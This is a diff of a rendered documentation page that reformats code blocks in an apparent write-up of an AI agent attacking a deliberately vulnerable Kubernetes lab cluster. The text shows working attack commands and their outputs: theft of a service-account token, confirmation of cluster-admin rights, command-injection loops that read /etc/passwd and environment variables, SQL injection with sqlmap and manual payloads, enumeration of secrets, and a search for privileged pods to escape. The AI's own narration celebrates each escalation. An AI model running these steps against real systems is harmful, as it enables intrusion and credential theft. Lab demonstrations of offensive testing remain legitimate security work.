plain">&quot;resourceAttributes&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:{</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;namespace&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;*&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;verb&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;*&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;resource&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;*&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">}}}&#x27; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  https://192.168.49.2:8443/apis/authorization.k8s.io/v1/selfsubjectaccessreviews</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Test 2: Permission check</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl -k -s -X POST \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -H &quot;Authorization: Bearer $TOKEN&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -H &quot;Content-Type: application/json&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -d &#x27;{&quot;spec&quot;:{&quot;resourceAttributes&quot;:{&quot;namespace&quot;:&quot;*&quot;,&quot;verb&quot;:&quot;*&quot;,&quot;resource&quot;:&quot;*&quot;}}}&#x27; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  https://192.168.49.2:8443/apis/authorization.k8s.io/v1/selfsubjectaccessreviews</span><br></div></code></pre></div></div>
 <p><strong>Result</strong>:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">{</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;status&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">: {</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;allowed&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">: </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">true</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;reason&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">: </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;RBAC: allowed by ClusterRoleBinding </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">\&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">vulnerable-cluster-admin-binding</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">\&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> of ClusterRole </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">\&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">cluster-admin</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">\&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">}</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">{</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &quot;status&quot;: {</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    &quot;allowed&quot;: true,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    &quot;reason&quot;: &quot;RBAC: allowed by ClusterRoleBinding \&quot;vulnerable-cluster-admin-binding\&quot; of ClusterRole \&quot;cluster-admin\&quot;&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">}</span><br></div></code></pre></div></div>
 <p><strong>AI Analysis</strong>:</p>
 <p>&gt; “CRITICAL! I have cluster-admin permissions! This is the highest level of access. I can now:</p>
 <ul>
@@ -340,14 +340,14 @@
 </li>
 </ul>
 <p><strong>AI Multiple Payload Testing</strong>:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># AI Decision: Test multiple command injection payloads</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Reasoning: Different commands reveal different information</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">for</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> payload </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">in</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;id&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;whoami&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;uname -a&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;cat /etc/passwd&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;ls -la /&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;env&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">; </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">do</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  curl -s -X POST </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;http://192.168.49.2:30081/api/execute&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    -H </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;Content-Type: application/json&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    -d </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;{\&quot;command\&quot;:\&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">$payload</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">\&quot;}&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">done</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># AI Decision: Test multiple command injection payloads</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Reasoning: Different commands reveal different information</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">for payload in &quot;id&quot; &quot;whoami&quot; &quot;uname -a&quot; &quot;cat /etc/passwd&quot; &quot;ls -la /&quot; &quot;env&quot;; do</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  curl -s -X POST &quot;http://192.168.49.2:30081/api/execute&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    -H &quot;Content-Type: application/json&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    -d &quot;{\&quot;command\&quot;:\&quot;$payload\&quot;}&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">done</span><br></div></code></pre></div></div>
 <p><strong>Results</strong>:</p>
 <ul>
 <li class="">
-<p><code>id</code>:<code>uid=0(root) gid=0(root) groups=0(root)</code></p>
+<p><code>id</code>: <code>uid=0(root) gid=0(root) groups=0(root)</code></p>
 </li>
 <li class="">
-<p><code>whoami</code>:<code>root</code></p>
+<p><code>whoami</code>: <code>root</code></p>
 </li>
 <li class="">
 <p><code>uname -a</code>: System information extracted</p>
@@ -386,11 +386,11 @@
 </ul>
 <p><strong>AI Multiple SQL Injection Methods</strong>:</p>
 <p><strong>Technique 1: SQLMap Automated</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># AI Decision: Use SQLMap for automated SQL injection testing</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Reasoning: SQLMap tests multiple techniques automatically</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;http://192.168.49.2:30080/?username=test&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  --batch --level</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">3</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> --risk</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">3</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># AI Decision: Use SQLMap for automated SQL injection testing</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Reasoning: SQLMap tests multiple techniques automatically</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;http://192.168.49.2:30080/?username=test&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  --batch --level=3 --risk=3</span><br></div></code></pre></div></div>
 <p><strong>AI Analysis</strong>:</p>
 <p>&gt; “SQLMap confirmed SQL injection! Database: MySQL &gt;= 5.6. It found UNION-based injection. This is another attack vector.”</p>
 <p><strong>Technique 2: Manual Payload Testing</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># AI Decision: Test manual payloads</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Reasoning: Verify SQLMap findings and test different techniques</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">for</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> payload </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">in</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;admin&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;admin&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;--&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;admin&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;/*&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;&#x27; UNION SELECT NULL--&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">; </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">do</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  curl -s </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;http://192.168.49.2:30080/?username=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">$(echo $payload | sed &#x27;s/ /%20/g&#x27;)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">done</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># AI Decision: Test manual payloads</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Reasoning: Verify SQLMap findings and test different techniques</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">for payload in \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &quot;admin&#x27; OR &#x27;1&#x27;=&#x27;1&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &quot;admin&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;--&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &quot;admin&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;/*&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &quot;&#x27; UNION SELECT NULL--&quot;; do</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  curl -s &quot;http://192.168.49.2:30080/?username=$(echo $payload | sed &#x27;s/ /%20/g&#x27;)&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">done</span><br></div></code></pre></div></div>
 <p><strong>AI Analysis</strong>:</p>
 <p>&gt; “Multiple SQL injection techniques work. This confirms the vulnerability and shows different ways to exploit it.”</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="stage-5-cluster-enumeration">Stage 5: Cluster Enumeration<a href="#stage-5-cluster-enumeration" class="hash-link" aria-label="Direct link to Stage 5: Cluster Enumeration" title="Direct link to Stage 5: Cluster Enumeration" translate="no">​</a></h3>
@@ -414,26 +414,26 @@
 </li>
 </ul>
 <p><strong>AI Comprehensive Enumeration</strong>:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># AI Decision: Enumerate all major resource types</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Reasoning: Need complete picture of cluster</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">for</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> resource </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">in</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> pods secrets configmaps serviceaccounts roles clusterroles; </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">do</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  curl -k -s -H </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;Authorization: Bearer </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">$TOKEN</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;https://192.168.49.2:8443/api/v1/</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">$resource</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> | jq </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&#x27;.&#x27;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">done</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># AI Decision: Enumerate all major resource types</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Reasoning: Need complete picture of cluster</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">for resource in pods secrets configmaps serviceaccounts roles clusterroles; do</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  curl -k -s -H &quot;Authorization: Bearer $TOKEN&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    &quot;https://192.168.49.2:8443/api/v1/$resource&quot; | jq &#x27;.&#x27;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">done</span><br></div></code></pre></div></div>
 <p><strong>AI Findings</strong>:</p>
 <ul>
 <li class="">
-<p><strong>27 pods</strong>discovered</p>
+<p><strong>27 pods</strong> discovered</p>
 </li>
 <li class="">
-<p><strong>50 service accounts</strong>discovered</p>
+<p><strong>50 service accounts</strong> discovered</p>
 </li>
 <li class="">
-<p><strong>1 secret</strong>discovered</p>
+<p><strong>1 secret</strong> discovered</p>
 </li>
 <li class="">
-<p><strong>19 ConfigMaps</strong>discovered</p>
+<p><strong>19 ConfigMaps</strong> discovered</p>
 </li>
 <li class="">
-<p><strong>12 Roles</strong>discovered</p>
+<p><strong>12 Roles</strong> discovered</p>
 </li>
 <li class="">
-<p><strong>73 ClusterRoles</strong>discovered</p>
+<p><strong>73 ClusterRoles</strong> discovered</p>
 </li>
 </ul>
 <p><strong>AI Analysis</strong>:</p>
@@ -453,24 +453,24 @@
 </li>
 </ul>
 <p><strong>AI Privileged Container Detection</strong>:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># AI Decision: Find privileged containers</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Reasoning: Privileged containers can escape to host</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl -k -s -H </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;Authorization: Bearer </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">$TOKEN</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;https://192.168.49.2:8443/api/v1/pods&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> | \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  jq -r </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&#x27;.items[] | select(.spec.containers[]?.securityContext.privileged == true) | &quot;\(.metadata.namespace)/\(.metadata.name)&quot;&#x27;</span><br></div></code></pre></div></div>
-<p><strong>Result</strong>:<strong>13 privileged pods</strong>found</p>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># AI Decision: Find privileged containers</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Reasoning: Privileged containers can escape to host</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl -k -s -H &quot;Authorization: Bearer $TOKEN&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &quot;https://192.168.49.2:8443/api/v1/pods&quot; | \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  jq -r &#x27;.items[] | select(.spec.containers[]?.securityContext.privileged == true) | &quot;\(.metadata.namespace)/\(.metadata.name)&quot;&#x27;</span><br></div></code></pre></div></div>
+<p><strong>Result</strong>: <strong>13 privileged pods</strong> found</p>
 <p><strong>AI Analysis</strong>:</p>
 <p>&gt; “13 privileged containers! These are serious security risks. Even if I didn’t have cluster-admin, I could potentially escape from one of these containers to the host.”</p>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="multiple-exploitation-methods">Multiple Exploitation Methods<a href="#multiple-exploitation-methods" class="hash-link" aria-label="Direct link to Multiple Exploitation Methods" title="Direct link to Multiple Exploitation Methods" translate="no">​</a></h2>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="ais-approach-to-finding-multiple-ways">AI’s Approach to Finding Multiple Ways<a href="#ais-approach-to-finding-multiple-ways" class="hash-link" aria-label="Direct link to AI’s Approach to Finding Multiple Ways" title="Direct link to AI’s Approach to Finding Multiple Ways" translate="no">​</a></h3>
 <p>The AI doesn’t stop at the first working method. It systematically tests multiple approaches:</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="token-extraction--3-methods-tested">Token Extraction — 3 Methods Tested<a href="#token-extraction--3-methods-tested" class="hash-link" aria-label="Direct link to Token Extraction — 3 Methods Tested" title="Direct link to Token Extraction — 3 Methods Tested" translate="no">​</a></h3>
-<p><strong>Method 1: Direct API Call</strong>✅</p>
+<p><strong>Method 1: Direct API Call</strong> ✅</p>
 <div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">curl -s http://192.168.49.2:30082/api/token</span><br></div></code></pre></div></div>
 <p><strong>Result</strong>: Token extracted successfully</p>
-<p><strong>Method 2: Alternative Paths</strong>❌</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">for</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> path </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">in</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> /token /api/token /v1/token /api/v1/token /auth/token; </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">do</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  curl -s </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;http://192.168.49.2:30082</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">$path</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">done</span><br></div></code></pre></div></div>
-<p><strong>Result</strong>: Only<code>/api/token</code>works</p>
-<p><strong>Method 3: Response Headers</strong>❌</p>
+<p><strong>Method 2: Alternative Paths</strong> ❌</p>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">for path in /token /api/token /v1/token /api/v1/token /auth/token; do</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  curl -s &quot;http://192.168.49.2:30082$path&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">done</span><br></div></code></pre></div></div>
+<p><strong>Result</strong>: Only <code>/api/token</code> works</p>
+<p><strong>Method 3: Response Headers</strong> ❌</p>
 <div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">curl -s -I http://192.168.49.2:30082/api/token</span><br></div></code></pre></div></div>
 <p><strong>Result</strong>: No token in headers</p>
-<p><strong>AI Conclusion</strong>: “Token is only accessible via<code>/api/token</code>endpoint. But I found it, and it works with Kubernetes API.&quot;</p>
+<p><strong>AI Conclusion</strong>: “Token is only accessible via <code>/api/token</code> endpoint. But I found it, and it works with Kubernetes API.&quot;</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="command-injection--6-payloads-tested">Command Injection — 6 Payloads Tested<a href="#command-injection--6-payloads-tested" class="hash-link" aria-label="Direct link to Command Injection — 6 Payloads Tested" title="Direct link to Command Injection — 6 Payloads Tested" translate="no">​</a></h3>
 <p><strong>AI Reasoning</strong>:</p>
 <p>&gt; “I want to test multiple commands to:</p>
@@ -491,22 +491,22 @@
 <p><strong>Payloads Tested</strong>:</p>
 <ul>
 <li class="">
-<p><code>id</code>- User information</p>
+<p><code>id</code> - User information</p>
 </li>
 <li class="">
-<p><code>whoami</code>- Current user</p>
+<p><code>whoami</code> - Current user</p>
 </li>
 <li class="">
-<p><code>uname -a</code>- System information</p>
+<p><code>uname -a</code> - System information</p>
 </li>
 <li class="">
-<p><code>cat /etc/passwd</code>- User accounts</p>
+<p><code>cat /etc/passwd</code> - User accounts</p>
 </li>
 <li class="">
-<p><code>ls -la /</code>- File system listing</p>
+<p><code>ls -la /</code> - File system listing</p>
 </li>
 <li class="">
-<p><code>env</code>- Environment variables (71 found!)</p>
+<p><code>env</code> - Environment variables (71 found!)</p>
 </li>
 </ul>
 <p><strong>AI Analysis</strong>:</p>
@@ -523,7 +523,7 @@
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="sql-injection--2-techniques-tested">SQL Injection — 2 Techniques Tested<a href="#sql-injection--2-techniques-tested" class="hash-link" aria-label="Direct link to SQL Injection — 2 Techniques Tested" title="Direct link to SQL Injection — 2 Techniques Tested" translate="no">​</a></h3>
-<p><strong>Technique 1: SQLMap Automated</strong>✅</p>
+<p><strong>Technique 1: SQLMap Automated</strong> ✅</p>
 <ul>
 <li class="">
 <p>Detected: Boolean-based blind SQL injection</p>
@@ -535,16 +535,16 @@
 <p>Technique: UNION query</p>
 </li>
 </ul>
-<p><strong>Technique 2: Manual Payloads</strong>✅</p>
+<p><strong>Technique 2: Manual Payloads</strong> ✅</p>
 <ul>
 <li class="">
-<p>Boolean-based:<code>admin&#x27; OR &#x27;1&#x27;=&#x27;1</code></p>
+<p>Boolean-based: <code>admin&#x27; OR &#x27;1&#x27;=&#x27;1</code></p>
 </li>
 <li class="">
-<p>Comment-based:<code>admin&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;--</code></p>
+<p>Comment-based: <code>admin&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;--</code></p>
 </li>
 <li class="">
-<p>Union-based:<code>&#x27; UNION SELECT NULL--</code></p>
+<p>Union-based: <code>&#x27; UNION SELECT NULL--</code></p>
 </li>
 </ul>
 <p><strong>AI Analysis</strong>:</p>
@@ -564,7 +564,7 @@
